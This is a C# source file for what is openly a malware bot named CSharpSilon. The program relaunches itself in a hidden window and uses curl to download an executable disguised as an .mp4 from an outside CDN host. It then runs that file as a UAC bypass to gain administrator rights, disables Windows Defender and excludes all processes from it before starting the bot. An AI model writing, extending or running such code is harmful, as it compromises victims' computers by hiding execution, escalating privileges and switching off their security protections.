using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using CSharpSilon.Utils;

namespace CSharpSilon
{
    class Program
    {
        static async Task Main(string[] args)
        {
            //StartBot(); // I Use This For Testing <3
            
            
            // Checks If The .exe Was Started With 1 Argument. Then Starts It With The Silent Argument.
            if (args.Length != 1)
            {
                Process.Start(new ProcessStartInfo()
                {
                    FileName = Process.GetCurrentProcess().MainModule.FileName,
                    Arguments = "-sil",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Verb = App.IsAdmin() ? "runas" : "",
                });
                Process.GetCurrentProcess().Kill();
            }
            
            // If It's Started Silently, Then It Starts The Bot.
            if (args.Length == 1)
            {
                if (args[0] == "-sil")
                {
                    StartBot();
                    Process.GetCurrentProcess().Kill();
                }
                else
                {
                    Process.GetCurrentProcess().Kill();
                }
            }
        }

        static async Task StartBot()
        {
            //This Is Used For UAC Bypassing. Source To The File: https://github.com/hfiref0x/UACME
            string tempPath = Environment.ExpandEnvironmentVariables("%temp%");
            string filePath = Path.Combine(tempPath, "kudos.exe");
            if (!File.Exists(filePath))
            {
                App.execute($"curl https://cdn.glitch.global/468fb133-32f7-4d65-815f-b96df918472c/kudos.mp4?v=1725894225335 --output {filePath}");
            }
            
            if (!App.IsAdmin())
            {
                if (!File.Exists(filePath))
                {
                    while (!File.Exists(filePath))
                    {
                        Thread.Sleep(750);
                    }
                }
                
                //Restarts The App As Admin, Then Exits The Current Process
                App.execute($"{filePath} 61 {Process.GetCurrentProcess().MainModule.FileName}");
                Environment.Exit(0);
            }
            App.Disable(); // Disables Window's Defender
            App.ExcludeAll(); // Exclude's All Processes From Window's Defender
            var bot = new Bot();
            bot.RunAsync().GetAwaiter().GetResult();
            Console.ReadLine();
        }
    }
}